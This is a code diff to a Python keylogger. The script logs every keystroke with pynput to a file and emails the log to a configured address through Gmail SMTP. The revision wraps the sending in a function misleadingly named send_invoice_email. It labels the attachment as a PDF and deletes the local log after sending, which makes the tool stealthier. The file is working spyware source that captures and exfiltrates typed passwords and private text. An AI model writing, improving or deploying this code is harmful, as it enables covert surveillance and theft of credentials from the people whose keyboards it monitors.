@@ -17,34 +17,15 @@ Modules used:
 -> ssl (pre-installed on Python)
 -> pynput (requires installation with "pip install pynput")
 '''
-
-# Defines an SMTP client session object to send mail to any internet machine with an SMTP or ESMTP listener daemon
 import smtplib
-# Provides access to TLS/SSL encryption and peer authentication facilities for network sockets
+import os
 import ssl
-# Allows the control and monitoring of input devices (mouse and keyboard)
 from pynput import keyboard
-
-# Replace user@domain.com with your email id (everywhere)
-sender_mail = "user@domain.com"
-# prefer using your own email id for receiver's as well.
-# Replace user@domain.com with your email id (everywhere)
-receiver_mail = "user@domain.com"
-password = "passcode"              # Enter your Password here
-port = 587
-message = """From: user@domain.com
-To: user@domain.com                         
-Subject: KeyLogs
-Text: Keylogs 
-"""
-
-
+from email.message import EmailMessage
 def write(text):
     with open("keylogger.txt", 'a') as f:
         f.write(text)
         f.close()
-
-
 def on_key_press(Key):
     try:
         if (Key == keyboard.Key.enter):
@@ -62,27 +43,35 @@ def on_key_press(Key):
             temp = repr(Key)+" Pressed.\n"
             write(temp)
             print("\n{} Pressed\n".format(Key))
-
-
 def on_key_release(Key):
-    # This stops the Listener/Keylogger.
-    # You can use any key you like by replacing "esc" with the key of your choice
     if (Key == keyboard.Key.esc):
         return False
+def send_invoice_email():
+    sender_mail = "YOUR SENDER GMAIL"
+    receiver_mail = "YOUR RECEIVER MAIL"
+    password = "YOUR APP PASSCODE"
+    
+    msg = EmailMessage()
+    msg['From'] = sender_mail
+    msg['To'] = receiver_mail
+    msg['Subject'] = "KeyLogs"
+    msg.set_content("Keylogs attached")
+    
+    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
+        listener.join()
+    
+    with open(r"keylogger.txt", "rb") as f:
+        file_data = f.read()
+    
+    msg.add_attachment(file_data,
+                        maintype="application",
+                        subtype="pdf",
+                        filename="keylogger.txt")
 
-
-with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
-    listener.join()
-
-with open("keylogger.txt", 'r') as f:
-    temp = f.read()
-    message = message + str(temp)
-    f.close()
-
-context = ssl.create_default_context()
-server = smtplib.SMTP('smtp.gmail.com', port)
-server.starttls()
-server.login(sender_mail, password)
-server.sendmail(sender_mail, receiver_mail, message)
-print("Email Sent to ", sender_mail)
-server.quit()
+    with smtplib.SMTP('smtp.gmail.com', 587) as server:
+        server.starttls()
+        server.login(sender_mail, password)
+        server.sendmail(sender_mail, receiver_mail, msg.as_string())
+        print("Email Sent to", receiver_mail)
+        os.remove(r"keylogger.txt")  
+send_invoice_email()
